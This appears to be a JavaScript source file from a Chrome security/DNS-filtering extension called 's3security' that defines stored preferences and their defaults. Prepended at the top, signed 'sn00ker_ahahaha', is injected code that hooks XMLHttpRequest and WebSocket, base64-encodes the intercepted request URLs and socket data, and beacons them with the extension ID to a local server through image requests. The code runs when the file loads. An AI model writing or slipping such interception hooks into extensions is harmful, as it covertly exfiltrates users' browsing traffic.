function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
s3security.prefs = {};
s3security.prefs.list = {};

//------------------------------------------------------------------------------
s3security.prefs.init = function(callback) {
	chrome.storage.local.get(function(items) {
		s3security.prefs.list = items;

		if (s3security.i18n) {
			s3security.i18n.init(items.current_locale);
		}

		s3security.prefs.check_defaults();
		if (callback) {
			callback();
		}
	});
}
//------------------------------------------------------------------------------
s3security.prefs.set = function(pref) {
	var pref_hash = {};
	pref_hash[pref.name] = pref.value;
	chrome.storage.local.set(pref_hash);
	s3security.prefs.list[pref.name] = pref.value;
}
//------------------------------------------------------------------------------
s3security.prefs.get = function(pref_name) {
	return s3security.prefs.list[pref_name];
}
//------------------------------------------------------------------------------
s3security.prefs.check_defaults = function() {
	var defaults = s3security.utils.clone_object(s3security.prefs.defaults);

	for (var pref_name in defaults) {
		if (s3security.prefs.list[pref_name] === undefined) {
			s3security.prefs.list[pref_name] = defaults[pref_name];
		}
		else if (typeof(s3security.prefs.list[pref_name]) != typeof(defaults[pref_name])) {
			s3security.prefs.list[pref_name] = defaults[pref_name];
		}
	}
}
//------------------------------------------------------------------------------
s3security.prefs.reset_defaults = function(callback) {
	chrome.storage.local.clear(function() {
		s3security.prefs.list = {};
		s3security.prefs.check_defaults();
		if (s3security.i18n) {
			s3security.i18n.init();
		}
		if (callback) {
			callback();
		}
	});
}
//------------------------------------------------------------------------------
s3security.prefs.defaults = {
	'current_version' : '0',
	'not_open_contribute_page' : false,
	'show_page_timer' : 0, 
//	'first_run' : true, 
	'show_page_foxdns' : false,

	'security_enabled' : true,
	'security_dns_list' : [],

//	'urlbar_colorized' : 'enabled',
	'startup_tabs_reload' : true, // chrome
	'current_locale' : '', // chrome

	'security_infected_alert' : true,
	'security_infected_action' : 'pagelock', // none , pagelock , forbid
	'security_infected_subrequest' : 'block_alien_domain', // none, block , block_alien_domain, prompt

	'security_adult_alert' : true,
	'security_adult_action' : 'pagelock', // none, pagelock , forbid
	'security_adult_subrequest' : 'block_alien_domain', // none, block , block_alien_domain, prompt

	'security_white_black_list' : {},

	'security_white_list_enabled' : true,
	'security_white_list_alert' : true,
	'security_white_list_subrequest_action' : 'block_alien_domain', // none, block_alien_domain, prompt

	'security_black_list_enabled' : true,
	'security_black_list_alert' : true,
	'security_black_list_action' : 'pagelock', // none , pagelock , forbid
	'security_black_list_closetab' : false,

	'security_page_lock_default' : true,
	'security_page_lock_source' : 'DEFAULT_PAGE',

//	'dns_server.timeout_value' : 1000,

	'password_value' : '',
//	'show_button_urlbar' : true,

	'show_context_menu_main' : true,
//	'show_context_menu_tab' : true,
//	'show_context_menu_urlbar' : true,

//	'statistics_short_enabled' : true,
//	'statistics_full_enabled' : false,
//	'statistics_full_directory' : '',
//	'statistics_full_save_only_main_request' : true,
//	'statistics_full_save_skipped_request' : false,
	'_end' : '_end'
};
//------------------------------------------------------------------------------
//------------------------------------------------------------------------------
s3security.prefs.init();
